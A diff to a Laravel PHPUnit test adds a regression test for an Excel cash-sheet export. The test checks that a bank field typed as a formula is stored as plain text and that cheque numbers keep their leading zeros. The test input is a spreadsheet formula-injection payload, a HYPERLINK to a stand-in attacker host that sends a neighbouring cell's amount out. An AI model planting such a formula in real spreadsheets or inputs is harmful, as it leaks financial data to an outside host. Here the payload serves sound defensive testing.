@@ -37,6 +37,7 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
 use Illuminate\Validation\ValidationException;
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
 use PhpOffice\PhpSpreadsheet\IOFactory;
 use PhpOffice\PhpSpreadsheet\Spreadsheet;
 use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;
@@ -326,6 +327,59 @@ class PlanillaDeCajaExcelTest extends TestCase
 
         $this->assertSame('53732213', (string) $hoja->getCell('E'.($fila + 1))->getValue());
         $this->assertSame(557660.0, (float) $hoja->getCell('H'.($fila + 1))->getValue());
+    }
+
+    /**
+     * Lo tipeado entra como texto, aunque parezca una fórmula.
+     *
+     * La planilla es un documento oficial que circula: un banco cargado
+     * como `=HYPERLINK(...)` quedaba como fórmula viva, con un enlace que
+     * podía llevarse los importes de las celdas vecinas. Y un número de
+     * cheque con ceros a la izquierda los perdía al convertirse en número.
+     */
+    public function test_el_texto_tipeado_no_se_convierte_en_formula(): void
+    {
+        $formula = '=HYPERLINK("https://atacante.example/?d="&H1,"Ver detalle")';
+
+        app(RegisterOpeningBalance::class)->handle(
+            cashBoxId: $this->caja(),
+            balances: [
+                LedgerAccount::CashOnHand->value => '6852300.00',
+                LedgerAccount::ChequesInCustody->value => '50000.00',
+            ],
+            denominations: $this->billetesPara('6852300.00'),
+            date: CarbonImmutable::parse('2026-06-01'),
+            cheques: [[
+                'number' => '00123456',
+                'bank' => $formula,
+                'issueDate' => '2023-06-06',
+                'amount' => '50000.00',
+                'expediente' => '131010/2023',
+                'company' => 'COBERTURA DE SALUD SA',
+                'beneficiary' => 'TINTILAY TOLABA HECTOR',
+            ]],
+        );
+
+        $this->arqueoListoParaCerrar($this->caja(), '2026-06-02');
+
+        $cierre = app(ClosePeriod::class)->handle(
+            cashBoxId: $this->caja(),
+            date: CarbonImmutable::parse('2026-06-02'),
+        );
+
+        $hoja = $this->abrir(app(ExportCashSheet::class)->handle($cierre)->object_key)
+            ->getSheetByName('REVERSO 020626');
+
+        $this->assertNotNull($hoja);
+
+        $fila = $this->rotulos($hoja)['RECIBO'] + 1;
+        $banco = $hoja->getCell('F'.$fila);
+
+        $this->assertSame(DataType::TYPE_STRING, $banco->getDataType());
+        $this->assertSame($formula, $banco->getValue());
+        $this->assertSame('00123456', $hoja->getCell('E'.$fila)->getValue());
+        // Los importes siguen siendo números.
+        $this->assertSame(DataType::TYPE_NUMERIC, $hoja->getCell('H'.$fila)->getDataType());
     }
 
     /** La cartera detallada tiene que sumar el saldo declarado. */
